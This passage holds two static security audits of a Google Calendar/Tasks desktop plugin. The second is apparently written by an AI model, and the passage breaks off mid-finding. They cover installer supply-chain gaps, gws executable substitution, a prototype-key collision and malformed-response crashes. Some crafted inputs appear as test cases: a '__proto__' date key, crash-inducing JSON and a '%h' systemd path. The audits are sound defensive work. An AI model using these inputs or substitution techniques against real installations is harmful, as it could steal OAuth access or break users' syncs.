**Title:** Supply-chain: AUR package built with `--noconfirm` (no PKGBUILD review), global npm install without `--ignore-scripts` and without tarball-hash verification
**Severity:** Low
**Confidence:** Medium
**CWE:** CWE-1357 (Reliance on Untrusted Inputs / supply chain), CWE-494
**Affected file:** `scripts/setup.sh`
**Affected functions:** `ensure_deps()` (setup.sh:176), `install_correct_gws()` (setup.sh:134–153)
**Approximate lines:** setup.sh:136, 149

**Attack precondition:** Compromise of the `google-cloud-cli` AUR package (maintainer takeover, injected `-git` flavor confusion) or of npm account/registry for `@googleworkspace/cli@0.22.5` between review-time and install-time.

**Attack path:** `yay -S --needed --noconfirm google-cloud-cli` executes AUR PKGBUILD code as the user without the review prompt; `npm install -g @googleworkspace/cli@0.22.5` runs that package's lifecycle scripts (postinstall) with no `--ignore-scripts` and no independently pinned integrity hash (npm's TLS+registry integrity is the only control). Version pinning and the cargo fallback pinned to a full commit SHA (`705fb0ec…`, setup.sh:149) are genuinely good — the SHA fails closed if force-pushed away.

**Why it is vulnerable:** The reviewer-facing claim "pinned so the marketplace reviews the exact bytes" is not fully true for the npm path (version-pinned, not hash-pinned) and not true at all for AUR.

**Concrete exploit scenario:** npm account compromise publishing a poisoned `0.22.5` — wait, version immutability blocks that; realistic variant: user's npm is configured with a corporate/attacker-suggested registry mirror that serves different bytes for the same version. Hash pinning would catch this; version pinning does not.

**Impact:** Arbitrary user-level code execution during install (which then benefits from F-04's persistence).

**Existing mitigation:** Exact version pins (npm 0.22.5, cargo rev SHA + `--locked`), wrong-`gws` detection heuristics, prompt before install.

**Why the mitigation is insufficient:** No cryptographic pinning of the npm artifact; `--noconfirm` suppresses the AUR review that is the actual control for AUR builds.

**Recommended fix:** Add `--ignore-scripts` to the npm install if the package supports it; fetch-and-verify the npm tarball SHA-512 against a hash committed to this repo (or document the SRI in setup.sh); for AUR, remove `--noconfirm` on the build step and show the PKGBUILD, or document manual install as the trusted path.

**Would the fix be breaking:** Possibly (npm may need scripts; AUR flow becomes interactive) — acceptable.

---

### F-10

**ID:** F-10
**Title:** All-day `dateKey` accepted without format validation → exotic keys (e.g., `__proto__`) reach `eventIndex` object keys (defense-in-depth gap)
**Severity:** Low
**Confidence:** Medium (reachability requires Google to accept a malformed `start.date`)
**CWE:** CWE-20, CWE-1321-adjacent (prototype-key collision in JS objects)
**Affected files:** `sync/schema.py` (`normalize_event`:258–271 — `dk = start_raw or ""` for all-day), `Model.js` (`eventIndex`:329–331, `dayRange` fallback returns `[startIso]` for unparseable input)
**Approximate line:** schema.py:263; Model.js:326–331

**Attack precondition:** A calendar event whose all-day `start.date` is not `YYYY-MM-DD` survives Google's API validation and reaches normalization (uncertain — Google validates the type server-side, which is why this is defense-in-depth, not a confirmed remote bug).

**Attack path:** `dk = start_raw` verbatim → stored in state.json → `eventIndex` uses it as an object key. For `key = "__proto__"`, `!index[key]` is false (prototype lookup truthy) so the bucket is never created, and `eventsForDate(index,"__proto__")` returns `Object.prototype` → `.slice` throws → QML binding error for the view. For `""`, `dayRange("")` returns `[""]` (harmless bucket).

**Why it is vulnerable:** The timed path is protected by `parse_datetime` (offset-mandatory) but the all-day path performs **no** `DATE_RE` check before using the raw string as a JS object key.

**Impact:** View-breaking exception / odd bucketing if reachable. No exec.

**Existing mitigation:** `validate_state` requires `dateKey` to match `DATE_RE` or `""` (schema.py:178–183) — **but** validation runs only on the final document in `run_sync` (sync.py:403); a failure preserves last-good, so a bad event would poison the *whole* sync (availability) rather than the index.

**Why the mitigation is insufficient:** Normalization emits unvalidated keys; validation is all-or-nothing instead of per-event.

**Recommended fix:** In `normalize_event`, for all-day events require `DATE_RE.match(start_raw)` (else `dk = ""`), mirroring the timed path.

**Would the fix be breaking:** No.

---

### F-11

**ID:** F-11
**Title:** Single-click, unconfirmed, un-undoable task deletion in the UI
**Severity:** Low
**Confidence:** High
**CWE:** CWE-451 (UI request oversight — destructive affordance), data-integrity
**Affected files:** `ClockTaskRow.qml:49` (delete button), `Panel.qml:235` (`deleteTask`), `sync/mutate.py:184–185` (`tasks.tasks delete` — Google Tasks delete is a hard delete, no trash)
**Approximate line:** ClockTaskRow.qml:49

**Attack precondition:** None (user error); aggravated by stale state — if `state.json` is stale, the row shown may no longer match the task the user believes they are deleting (ID is taken from cached state, mutate does no re-fetch-before-delete).

**Attack path:** One click on 󰆴 → `task-delete --list --task` → permanent deletion on Google.

**Why it is vulnerable:** Destructive write with zero confirmation and no undo, driven by possibly-stale IDs.

**Impact:** Permanent loss of user data from a mis-click or from acting on a stale row.

**Existing mitigation:** None (hover color hint only).

**Recommended fix:** Two-state confirm (button turns into "confirm?" for 3s) or a toast with a 5-second undo window; optionally verify the task still exists server-side before delete.

**Would the fix be breaking:** UX-only.

---

### F-12

**ID:** F-12
**Title:** PR #9 residue: weak random-suffix fallback + attacker-registered project-id suggestion risk (informational)
**Severity:** Informational
**Confidence:** High
**CWE:** CWE-338 (weak fallback entropy — availability only)
**Affected file:** `scripts/setup.sh` (PR #9, commit d95472c)
**Approximate lines:** setup.sh:37–41, 255

**Review of PR #9 specifically:** No injection or privilege issue found. `PROJECT` is always quoted at use sites; the `grep -E "PERMISSION_DENIED.*$PROJECT"` interpolation (setup.sh:252) can only alter regex matching, never execute. The random suffix (8 hex chars from `/dev/urandom`) is adequate; the fallback `date +%s | tail -c5` (setup.sh:38) is guessable — worst case a colliding project id causes a benign PERMISSION_DENIED. Residual social-engineering risk is inherent and *not introduced by this PR*: a user who passes `--project <attacker-chosen-id>` will run `gws auth setup` against the attacker's GCP project; the OAuth consent screen will display attacker branding, though tokens are exchanged locally by gws and remain local (the attacker's client cannot harvest them because gws is pinned and does the exchange locally). The README example `--project my-gcp-project` encourages guessable ids.

**Recommended fix:** Prefer a stronger fallback (`$RANDOM$RANDOM` or `/proc/sys/kernel/random/uuid`), and add a README warning never to use a project id you didn't create. **Breaking:** No.

---

### F-13

**ID:** F-13
**Title:** PR #8 residue: bounded retry churn when state.json never appears; dirWatcher widens change-source surface (informational)
**Severity:** Informational
**Confidence:** High
**Affected file:** `ClockStateFile.qml` (PR #8, commit 842886c)
**Approximate lines:** ClockStateFile.qml:61–80

**Review of PR #8 specifically:** The new reader path is secure: the `sh -c` script takes the path as quoted positional `$1` and a constant numeric `$2` (`String(Model.MAX_STATE_CHARS)`), so neither a hostile path nor size can inject shell syntax; `head -c` is a single bounded open, closing the size-check/read TOCTOU; over-ceiling output is refused on raw byte count before parsing. Two notes: (1) if setup.sh is never run, the unreadable→`retryTimer.restart()` loop spawns one `sh` every 3 s indefinitely — bounded and negligible, but a backoff would be cleaner; (2) `dirWatcher` makes any write in the state directory trigger a reader spawn — only the user/root can write there (0700 after first sync; before first sync `~/.local/state` is 0700 by default on systemd hosts), so no cross-user trigger. No vulnerability introduced.

---

## Section Reports

### A / Executive Verdict

This is a **security-conscious codebase with three real problems**: one High-severity remote DoS via unbounded multi-day event expansion (F-01), a weakened authorization model around privileged installer actions (F-02), and a cross-calendar ID-shadowing integrity flaw (F-03). The core architecture is strong: QML never touches tokens, all Google strings render as `PlainText`, process execution is argv-array based with correct shell quoting where a shell is used, reads and writes are size-bounded and atomic, and OAuth scopes are minimized to `calendar,tasks` with credentials held entirely by `gws`/keyring. Recent security rounds (commits ed8b215…f5e8dca) closed the classic bugs (unbounded FileView reads, pipe-bombing, curl-pipe-shell, URL scheme bypass). Both recently merged PRs (#8, #9) introduce **no** new vulnerabilities.

**Verdict: PASS WITH REQUIRED FIXES** (F-01 must be fixed before wide distribution; F-02/F-03 strongly recommended).

### B / Critical & High Findings

- **High:** F-01 — unbounded `dayRange` expansion; sustained shell freeze/memory blow from one malicious shared-calendar event, repeating every sync cycle.
- No Critical findings. No arbitrary code execution, no token exposure, no privilege escalation to root, no shell injection was found anywhere in the data flows traced.

### C / Medium Findings

- F-02 — sudo package removal/install auto-approved without dedicated prompt in non-tty/`--yes` modes.
- F-03 — `dedupe()` cross-calendar ID shadowing (UI event spoofing/suppression).

### D / Low Findings

- F-04 — unvalidated `gwsPath` executable sink + timer persistence.
- F-05 — `Toggle` label `textFormat` unverified for attacker calendar names.
- F-06 — user input logged via `console.warn`.
- F-07 — unquoted paths in generated `ExecStart`.
- F-08 — `gcloud auth revoke --all` over-broad destructive scope.
- F-09 — supply-chain: no npm hash pin / `--ignore-scripts`; AUR `--noconfirm`.
- F-10 — all-day `dateKey` not format-validated at normalization.
- F-11 — unconfirmed, permanent task deletion.

### E / Existing Security Strengths (keep these)

- `subprocess` usage is argv-array only; **zero** `shell=True`/`os.system`/`eval`/`exec` in Python (verified by grep). The one shell string in QML (`Panel.qml:178`) is correctly POSIX-quoted by `shellQuote()`; the `ClockStateFile` reader uses positional params so the path can never break out (ClockStateFile.qml:38–43).
- Bounded reads everywhere: `head -c` single-open with sentinel (ClockStateFile.qml:40), `MAX_STATE_BYTES`/`MAX_STATE_CHARS` parity (sync.py:47 / Model.js:455), `load_last_good` capped, `load_config` capped (config.py:87–89), `MAX_RESPONSE_BYTES` per-stream cap that kills the child (gws_adapter.py:124–128), page/item caps (`MAX_LIST_PAGES`/`MAX_LIST_ITEMS`).
- Atomic, permission-hardened writes: unique tmp names (pid+counter), `fchmod 0600`, `fsync`, `replace()`, dir 0700 re-asserted (sync.py:169–195, config.py:143–163).
- All Google-controlled strings rendered with `textFormat: Text.PlainText` in every Text element in this repo.
- URL scheme allowlist correctly implemented and actually matching post-`f5e8dca` (Panel.qml:244–257), opened via `Qt.openUrlExternally`, never via a shell.
- OAuth hygiene: plugin never sees tokens; scopes limited to `calendar,tasks`; `--purge-credentials` documents that online revocation is still required; config/state files 0600/0700.
- Supply-chain pins: npm version pin, cargo pinned to full commit SHA with `--locked` (fails closed on force-push), no curl-pipe-shell (removed in `329f4aa`).
- gws output never trusted for control flow beyond documented exit codes; auth/API errors re-raised so a partial fetch can't overwrite last-good state with an empty "ok" (sync.py:330–335).
- Per-field clips (`MAX_TITLE_CHARS`/`MAX_NOTES_CHARS`/`MAX_URL_CHARS`) and aggregate caps bound state.json.

### F / Attack-Surface Map

```
[Remote/Google data]  shared-calendar organizer ──► gws ──► sync.py normalize ──► state.json ──► QML
   F-01 (dayRange DoS), F-03 (id shadowing), F-05 (calendar name via host Toggle), F-10 (dateKey)
   htmlLink/meetUrl ──► openEventLink (scheme allowlist — OK) ──► Qt.openUrlExternally

[Local user input]    Panel.qml forms ──► argv array ──► mutate.py (argparse-validated) ──► gws ──► Google
   No shell anywhere; flag-confusion only yields argparse usage errors (benign)

[Local state files]   ~/.config/parm.clock/config.json (gwsPath) ──► 5-min timer exec   (F-04)
                      ~/.local/state/parm.clock/state.json ──► bounded QML reader       (hardened)
                      ~/.config/omarchy/shell.json settings ──► QML settings            (user-owned)

[Installer]           setup.sh ──► yay/AUR (F-09), npm -g (F-09), sudo pacman (F-02),
                      gcloud/gws OAuth (F-12 residual), systemd unit generation (F-07)
                      uninstall.sh ──► rm -rf fixed paths, jq rewrite, gcloud revoke (F-08)

[Persistence]         systemd user timer runs plugin code from user-writable dir every 5 min
                      (inherent to plugins; F-04 makes it attacker-convenient)
```

**Most Dangerous Trust Boundary:** *Shared-calendar organizer → Google API → state.json → QML.* It is the only boundary where a remote attacker delivers data that this repo then executes **as data into unbounded algorithms** (F-01) and renders with partial trust (F-03/F-05). Everything else requires prior user-level code execution.

### G / Top Fixes Ranked by Risk Reduction

1. **Clamp event span** in `Model.js dayRange()` and `sync/schema.py:normalize_event` (F-01) — largest single risk reduction.
2. **Require explicit interactive consent for sudo/package steps**; kill the non-tty auto-yes for privileged actions (F-02).
3. **Dedupe by `(calendarId, id)` with primary-calendar preference** (F-03).
4. **Validate `gwsPath`** (absolute, executable, user-owned) and quote `ExecStart` paths (F-04, F-07).
5. **Verify `Toggle`/host label `textFormat` is PlainText** or sanitize calendar names (F-05).
6. Hash-pin the npm artifact / add `--ignore-scripts`; review AUR invocation (F-09).
7. Confirm-before-delete for tasks (F-11).
8. `DATE_RE`-validate all-day `dateKey` at normalization (F-10).
9. Narrow `gcloud auth revoke` and its prompt wording (F-08).
10. Stop logging full mutate args (F-06).

### H / Questions Requiring Manual Testing

1. Does `qs.Ui.Toggle`/`Dropdown` render `label` as PlainText or AutoText? (determines F-05).
2. Does Google's Events API actually accept `start.date="0001-01-01"`/year-9999 spans and multi-millennium `dateTime` values? (calibrates F-01's exact blast radius).
3. Does `gws auth setup` output (captured by `tee` into a mktemp file, setup.sh:248) ever contain the client secret or consent URL with embedded secret?
4. Can `@googleworkspace/cli@0.22.5` be installed with `--ignore-scripts` without breaking its auth flow?
5. What does the host `bar.run()` actually execute with (shell? argv?) — confirms the `Panel.qml:178` quoting is sufficient end-to-end.
6. Behavior when two syncs race (`Persistent=true` catch-up + mutate refresh) — confirm `startedGeneration` logic in ClockStateFile settles on newest file under rapid writes.

### I / Security Regression Tests to Add

1. `test_model.js`: event with `dateKey=0001-01-01`, `endDateKey=9999-12-31` — assert `eventIndex` size bounded (≤ cap) and `dayRange` clamps.
2. `test_sync.py`: two calendars returning same event id with different titles in fixed order — assert primary calendar's copy survives dedupe.
3. `test_schema.py`: all-day event with `start.date="__proto__"` and `"not-a-date"` — assert `dateKey == ""` post-fix, and `validate_state` accepts the document.
4. `test_config.py`: `gwsPath` relative/nonexistent/non-executable → `validate_config` errors; `apply_interval` rejects interval 7.
5. Shell test: run `setup.sh --dry-run < /dev/null` and assert **no** `sudo` lines appear in "would run" output (privileged steps must be opt-in).
6. QML test: `parseState` with 4 MB+1 payload refuses; reader sentinel path with a path containing spaces and `'` quotes.
7. `test_gws_adapter.py`: response stream exceeding `MAX_RESPONSE_BYTES` kills child and raises `kind="limit"` (may exist — verify it covers stderr too).

### J / False Positives & Things NOT to Change

**Explicitly rejected as non-issues (no realistic attack path):**
- "npm/cargo install is dangerous" as a blanket claim — pins are present; only the hash-pinning gap (F-09) is actionable.
- `runSync`'s shell string — correctly quoted; only constant `omarchy-shell -q parm.clock refresh` appended.
- `ClockStateFile` `sh -c` — positional-param design is injection-proof as written.
- `ask()` reading from `/dev/tty` — standard installer pattern; the *privileged* variant is F-02.
- Prototype pollution via `JSON.parse` — safe by construction for the reachable keys; only the F-10 edge exists.
- `rm -rf` targets in uninstall.sh — all derived from fixed `$HOME`/XDG paths, never from external input.
- mktemp usage in setup.sh/uninstall.sh — safe (0600, O_EXCL; `mv` after `jq -e` validation).
- Symlink/TOCTOU on state/config tmp files — directory is 0700 user-owned before any write; no cross-user planting possible.

**Do not change (already secure by design):** argv-array `Process.command` usage in QML; `shellQuote` implementation; the head-c single-open reader; atomic write pipeline and permission model; `PlainText` discipline; URL scheme allowlist; scope minimization (`calendar,tasks`); the cargo SHA pin; the bounded-read/byte-ceiling pairing between writer and reader; preserving last-good state on any validation failure.

===== GPT-5.6 LUNA =====

# Security Audit

Scope: complete repository at `/home/parm/Code/Projects/omarchy-google-calendar-clock`, including the untracked `sync/apply_interval.py`. This was a read-only static audit. No files, commits, or PRs were created.

No Critical findings were identified. One High-severity supply-chain finding and several Medium/Low findings were identified.

## A. Executive Security Assessment

The repository has undergone substantial defensive hardening:

- Subprocesses generally use argv arrays rather than shell interpolation.
- Google-controlled display strings use `Text.PlainText`.
- State and gws output have explicit size limits.
- State writes use private permissions and atomic replacement.
- Pagination and worker concurrency are bounded.
- OAuth credentials are delegated to `gws`.
- Event/task IDs are passed as subprocess arguments, not shell fragments.
- The QML link opener restricts URI schemes.

The primary residual risk is installation and executable trust:

1. The installer executes packages from npm, Cargo/GitHub, yay/AUR, and PATH without cryptographic verification of the complete artifact chain.
2. The selected `gws` executable is trusted based on PATH and heuristic help/version output.
3. The configured `gwsPath` is treated as an executable authority with no ownership, mode, or location validation.
4. Generated systemd units embed paths without robust systemd escaping.
5. Remote data validation is incomplete for identifiers and nested object shapes, leaving malformed API/CLI responses capable of crashing or corrupting synchronization.
6. Destructive operations rely on stale cached identifiers and have no confirmation or server-side identity verification.

The service runs as a systemd user service, so the major issues generally do not cross from an unprivileged attacker into root. They can nevertheless cause OAuth credential theft, unauthorized Google operations, persistence as the user, data corruption, or denial of service.

## B. Critical/High Findings

### SEC-001

**Title:** Dependency installation trusts unverified third-party package/build supply chains  
**Severity:** High  
**Confidence:** High

**Affected file:** `scripts/setup.sh`  
**Affected function/section:** `install_correct_gws()`, `ensure_deps()`  
**Approximate line:** 117-154, 168-191

**Attack precondition:** A dependency source, package maintainer account, registry artifact, AUR recipe, GitHub repository content, or local package manager mirror is compromised.

**Attacker capability:** Ability to publish or influence the package/build artifact resolved by npm, Cargo, yay/AUR, or an upstream repository.

**Attack path:**

```text
setup.sh
  -> yay -S google-cloud-cli
  -> npm install -g @googleworkspace/cli@0.22.5
  -> cargo install --git ... --rev <SHA> --locked
  -> executable installed and later trusted for OAuth/API access
```

**Why it is vulnerable:**

- `yay -S google-cloud-cli` executes an AUR build recipe and installs a package with root privileges through the package manager.
- npm installation is version-pinned but does not verify an expected package tarball hash or lock the complete transitive dependency tree.
- The Cargo fallback pins the repository commit, which is stronger, but does not independently verify the repository contents or all external source dependencies before compilation.
- There is no signature verification, checksum allowlist, trusted artifact manifest, or detached signature validation.
- The README explicitly recommends the automatic installation path for users.

A version pin is not equivalent to cryptographic artifact verification. It reduces accidental drift but does not protect against a compromised package publishing/build path or a compromised upstream account.

**Concrete exploit scenario:**

1. An attacker compromises the npm publication or a transitive dependency used by `@googleworkspace/cli@0.22.5`.
2. A user runs the documented setup script.
3. The malicious package installs a replacement `gws`.
4. The executable receives OAuth-related commands and later Calendar/Tasks data.
5. It exfiltrates authorization material or calendar/task contents while behaving sufficiently like `gws` to pass the installer checks.

A similar scenario applies to a malicious AUR `google-cloud-cli` build recipe. Because package installation may invoke `sudo`, the build/install chain also has access to the machine-wide package boundary.

**Impact:**

- OAuth credential theft.
- Calendar and Tasks data exfiltration.
- Unauthorized Calendar/Tasks CRUD operations.
- Potential root compromise through a malicious package installation path.
- Persistent malicious executable installation.

**Existing mitigation:**

- npm package version is pinned to `0.22.5`.
- Cargo uses a specific Git revision and `--locked`.
- The installer distinguishes the Google Workspace CLI from the unrelated pacman `gws`.
- Installation is normally prompted.
- The README identifies the package source.

**Why the mitigation is insufficient:**

- No cryptographic hash/signature verification is performed by this repository.
- npm dependencies are not verified against a repository-controlled lockfile or integrity manifest.
- AUR recipes and package contents are not independently inspected or signed by the plugin.
- `is_correct_gws()` checks output strings, not executable provenance or cryptographic identity.
- `--yes` suppresses the user confirmation.

**Recommended fix:**

- Prefer distribution packages or officially signed release artifacts.
- Verify detached signatures or SHA-256 hashes against a trusted, repository-controlled manifest obtained through an authenticated release process.
- Avoid AUR installation from the plugin’s automatic path, or require explicit user confirmation with a clear root-execution warning.
- For npm, use a controlled lockfile and verify package integrity, or install a vendor-supplied signed binary.
- Verify the resulting executable’s checksum/signature before using it for OAuth.
- Avoid automatically replacing an existing executable with a package of uncertain provenance.

**Would the fix be breaking:** Yes. It would change the supported installation flow and may require manual dependency installation.

---

### SEC-002

**Title:** PATH and heuristic executable checks permit malicious `gws` substitution before OAuth  
**Severity:** High  
**Confidence:** Medium

**Affected file:** `scripts/setup.sh`  
**Affected function/section:** `is_correct_gws()`, `ensure_deps()`, `ensure_auth()`  
**Approximate line:** 80-99, 201-228, 233-280

**Attack precondition:** The user runs setup with an attacker-controlled or compromised `PATH`, or a malicious executable is placed earlier in PATH.

**Attacker capability:** Ability to influence the setup process environment or provide a directory searched by PATH. This does not require root.

**Attack path:**

```text
attacker-controlled PATH
  -> command -v gws
  -> gws --help / gws auth --help / gws --version
  -> heuristic passes
  -> gws auth setup
  -> gws auth login
  -> gws receives OAuth/API operations
```

**Why it is vulnerable:**

- The installer discovers `gws` using `command -v gws`.
- It validates the binary by searching human-readable output for strings such as `"Google Workspace"`, `"auth setup"`, `"calendar"`, `"tasks"`, or `"google"`.
- A malicious executable can print those expected strings while recording arguments, environment data, or OAuth-related activity.
- Later, the path is persisted into `config.json` as `gwsPath`.
- The setup script also invokes `gcloud`, `python3`, `pacman`, `yay`, `npm`, `cargo`, `sudo`, `head`, `od`, `tr`, `date`, `grep`, `tee`, `mktemp`, `cat`, `chmod`, and `systemctl` through PATH resolution.

This is executable substitution rather than shell injection.

**Concrete exploit scenario:**

A user has a shell PATH containing a writable project-local bin directory or runs setup from a compromised launcher that prepends an attacker directory. A fake `gws` prints convincing help output, accepts `auth login`, and captures the resulting OAuth flow or later API request arguments. Setup accepts it and writes its absolute path to configuration.

**Impact:**

- OAuth authorization theft or interception.
- Calendar/Tasks contents captured.
- Unauthorized API operations.
- Persistent use of the malicious executable by future systemd syncs.

**Existing mitigation:**

- The script attempts to distinguish the known incorrect pacman `gws`.
- `gwsPath` is persisted as an absolute path instead of resolving PATH on every sync.
- The Python adapter uses `shutil.which()` only when no override is configured.

**Why the mitigation is insufficient:**

- Human-readable help/version output is trivially spoofable.
- Absolute-path persistence preserves the attacker-selected binary.
- No checksum, signature, owner, or permission check is performed.
- Other helper commands remain PATH-resolved.

**Recommended fix:**

- Use trusted absolute paths for all security-sensitive tools.
- Require an explicit, validated executable path for `gws`.
- Verify executable ownership, mode, and checksum/signature.
- Avoid heuristic identity checks based on command output.
- Use a controlled environment with a minimal fixed PATH for setup and systemd.
- Do not persist an arbitrary PATH-selected executable without provenance verification.

**Would the fix be breaking:** No for existing trusted installations; potentially yes for users relying on custom executable locations or PATH-installed tools.

## C. Medium Findings

### SEC-003

**Title:** User-controlled `gwsPath` is an unrestricted executable authority  
**Severity:** Medium  
**Confidence:** High

**Affected file:** `sync/config.py`, `sync/sync.py`, `sync/mutate.py`, `sync/gws_adapter.py`  
**Affected function/section:** `validate_config()`, `_find_gws()`, `run_sync()`  
**Approximate line:** `config.py:133-135`; `gws_adapter.py:70-77`; `sync.py:283-288`

**Attack precondition:** `~/.config/parm.clock/config.json` contains an attacker-selected `gwsPath`, or an attacker can alter the configured path before a timer or QML mutation runs.

**Attacker capability:** Ability to modify the user’s configuration or control an installation/configuration source. This is not a root escalation because the service runs as the same user.

**Attack path:**

```text
config.json
  -> gwsPath
  -> load_config()
  -> _find_gws(path_override)
  -> subprocess.Popen([gwsPath, ...])
```

**Why it is vulnerable:**

`validate_config()` only checks that `gwsPath` is a non-empty string. `_find_gws()` returns it without checking:

- Whether it is absolute.
- Whether it exists.
- Whether it is executable.
- Whether it is owned by the user.
- Whether it is a regular file.
- Whether it is inside an approved installation location.
- Whether it has changed since setup.

The path is used for reads, writes, deletes, and synchronization.

**Concrete exploit scenario:**

A malicious local configuration modification changes `gwsPath` to a wrapper executable. The next timer run invokes it with Calendar/Tasks requests. The wrapper logs or modifies arguments and returns convincing JSON.

**Impact:**

- Calendar/Tasks data disclosure.
- Unauthorized CRUD operations.
- User-level persistence and command execution whenever the timer runs.

**Existing mitigation:**

- Config and config directory are intended to be mode `0600`/`0700`.
- The path is normally generated from `command -v gws`.
- Subprocess invocation is not shell-based.

**Why the mitigation is insufficient:**

- File permissions do not protect against another process already running as the same user.
- The configuration is explicitly user-writable.
- No executable identity or integrity validation exists.

**Recommended fix:**

Validate and pin the executable during setup, then verify it at use time by ownership, mode, absolute location, and preferably checksum/signature. Consider removing the arbitrary path override and using a fixed trusted location.

**Would the fix be breaking:** Yes for users intentionally configuring custom `gws` binaries.

---

### SEC-004

**Title:** Generated systemd `ExecStart` is not robustly escaped for arbitrary installation paths  
**Severity:** Medium  
**Confidence:** High

**Affected file:** `scripts/setup.sh`  
**Affected function/section:** `install_systemd()`  
**Approximate line:** 352-406

**Attack precondition:** The repository is installed under a path containing spaces, systemd specifiers such as `%`, or other characters significant to systemd unit parsing.

**Attacker capability:** Ability to influence the plugin installation path. This is normally the installing user, but it can also occur when a user clones a repository into an attacker-chosen directory or follows a manipulated installation path.

**Attack path:**

```text
plugin path
  -> SYNC_DIR
  -> heredoc-generated ExecStart
  -> systemd user unit parser
  -> failed or differently interpreted service command
```

**Why it is vulnerable:**

The generated unit uses:

```text
ExecStart=$python_bin $SYNC_DIR/sync.py
```

Neither path is escaped for systemd’s `ExecStart` syntax.

Potential consequences include:

- Paths containing spaces being split into multiple arguments.
- `%` sequences being interpreted as systemd specifiers.
- Backslash/quoting behavior differing from shell expectations.
- A unit that fails to start or invokes an unintended path/argument structure.

This is not shell injection because systemd does not invoke a shell here, but it is unsafe command construction for a different command parser.

**Concrete exploit scenario:**

The plugin is installed under a path such as `/home/user/plugins/%h clock/`. Setup writes that literal path into `ExecStart`; systemd expands `%h` or parses the space unexpectedly. The service can fail, or the resulting command can differ from the intended script invocation.

**Impact:**

- Synchronization failure.
- Potential user-level command/path confusion.
- Loss of expected persistence and state refresh.

**Existing mitigation:**

- Setup uses absolute paths.
- The template comments explain portability.
- The service runs as a systemd user service rather than root.

**Why the mitigation is insufficient:**

Absolute paths still require systemd-specific escaping. Shell quoting rules are not sufficient for unit files.

**Recommended fix:**

Use systemd-compatible escaping when rendering paths, reject unsupported path characters, or install the plugin in a canonical path and use a fixed unit design. Validate the rendered unit with `systemd-analyze verify`.

**Would the fix be breaking:** No for normal paths; potentially yes for unusual existing installation paths.

---

### SEC-005

**Title:** Malformed remote object shapes can crash the sync worker and cause repeated timer failures  
**Severity:** Medium  
**Confidence:** High

**Affected file:** `sync/schema.py`, `sync/sync.py`  
**Affected function/section:** `normalize_event()`, `normalize_task()`, worker functions `_fetch_events()` and `_fetch_tasks()`  
**Approximate line:** `schema.py:248-321`, `338-356`; `sync.py:323-371`

**Attack precondition:** `gws` returns malformed JSON objects, or a compromised/malfunctioning CLI emits valid JSON with unexpected types.

**Attacker capability:** Ability to influence the upstream CLI/API response. A compromised `gws` executable or hostile intermediary is realistic under the supply-chain/executable-substitution scenarios. A normal Google API is expected to conform to its schema.

**Attack path:**

```text
Google API / gws
  -> JSON object with unexpected nested types
  -> raw.get(...) / start.get(...) / list item .get(...)
  -> uncaught AttributeError or TypeError
  -> sync worker failure
  -> systemd timer repeatedly retries
```

**Why it is vulnerable:**

Examples:

- `_fetch_events()` assumes every `raw` item is a dictionary and calls `raw.get("status")`.
- `_fetch_tasks()` assumes every task is a dictionary.
- `normalize_event()` assumes `raw["start"]` and `raw["end"]`, when present, are dictionaries.
- `normalize_event()` returns raw IDs without coercing or validating them.
- `dedupe()` inserts `ev.get("id")` into a set. A list/dict ID causes `TypeError: unhashable type`.
- `calendar_ids = [c["id"] for c in calendars]` assumes every calendar has a usable string ID.
- `filter_tasklists()` compares unvalidated IDs against configuration values.

The outer sync handler catches selected `GwsError`, `OSError`, and timezone exceptions, but not arbitrary `AttributeError`, `TypeError`, or malformed worker results.

**Concrete exploit scenario:**

A malicious replacement `gws` returns:

```json
{"items":[{"id":{},"start":[],"end":[]}]}
```

The sync crashes in normalization or deduplication. The systemd timer retries every interval, producing repeated failures and leaving stale data displayed.

**Impact:**

- Persistent sync denial of service.
- Stale or unavailable Calendar/Tasks data.
- Potential CPU/process consumption from repeated timer executions.
- State refresh failures after a malicious CLI response.

**Existing mitigation:**

- Output size limits.
- JSON parsing.
- Field length caps for free-text fields.
- Pagination limits.
- State schema validation after normalization.
- Last-good state preservation.

**Why the mitigation is insufficient:**

Validation occurs after normalization. The unsafe assumptions execute before `validate_state()` can reject the data. The exception classes that arise from malformed shapes are not consistently handled.

**Recommended fix:**

Validate each list item and nested object shape before accessing it. Enforce string IDs and bounded IDs before deduplication or subprocess use. Treat malformed individual records as skipped records, while preserving the last-good state if the response is substantially invalid.

**Would the fix be breaking:** No for conforming Google API responses.

---

### SEC-006

**Title:** API list cardinality can cause a large number of subprocess calls and timer starvation  
**Severity:** Medium  
**Confidence:** Medium

**Affected file:** `sync/gws_adapter.py`, `sync/sync.py`  
**Affected function/section:** `_list_all()`, `run_sync()` worker submission  
**Approximate line:** `gws_adapter.py:249-287`; `sync.py:317-393`

**Attack precondition:** The authenticated account has a very large number of calendars/task lists, or `gws` returns many valid list entries.

**Attacker capability:** Ability to cause many calendars/task lists to be visible to the authenticated account, potentially through sharing/invitations or a compromised CLI.

**Attack path:**

```text
calendarList/tasklists
  -> up to 5,000 entries per list call
  -> one events/tasks subprocess per entry
  -> six-worker executor
  -> up to 600-second systemd service
  -> repeated timer invocations
```

**Why it is vulnerable:**

- `_list_all()` caps list results at 5,000 items, but 5,000 is still a substantial fan-out.
- `run_sync()` submits one event fetch per calendar and one task fetch per task list.
- Each request can take up to 120 seconds.
- The service timeout is 600 seconds.
- There is no aggregate calendar/task-list count limit appropriate for the UI or a total API-call budget.
- Repeated failures or large accounts can keep the timer continuously busy.

**Concrete exploit scenario:**

An attacker shares a large number of calendars with the victim account, or a malicious `gws` returns thousands of calendar IDs. The plugin makes thousands of subprocess/API requests over repeated timer runs. The user sees stale data and system resource consumption.

**Impact:**

- CPU, process, network, and keyring overhead.
- Repeated timer timeout/failure.
- Delayed or missing synchronization.
- Potential UI staleness and resource starvation.

**Existing mitigation:**

- Maximum 20 pages.
- Maximum 5,000 list items.
- Six concurrent workers.
- Per-command 120-second timeout.
- Overall systemd timeout of 600 seconds.
- State event/task caps.

**Why the mitigation is insufficient:**

The caps bound individual outputs but do not sufficiently bound total work or total subprocess count.

**Recommended fix:**

Add a total API-call/calendar/task-list budget, lower practical list limits, skip or warn after a configurable maximum, and prevent overlapping sync executions.

**Would the fix be breaking:** Possibly. Very large accounts would receive truncated results.

---

### SEC-007

**Title:** Predictable config temporary file permits replacement races and symlink redirection  
**Severity:** Medium  
**Confidence:** Medium

**Affected file:** `sync/config.py`, `sync/apply_interval.py`  
**Affected function/section:** `save_config()`, `_write_timer()`  
**Approximate line:** `config.py:149-163`; `apply_interval.py:76-80`

**Attack precondition:** Another process can modify files in the user’s configuration/systemd directory while the plugin is writing. This generally means same-user access or a compromised process running as the user.

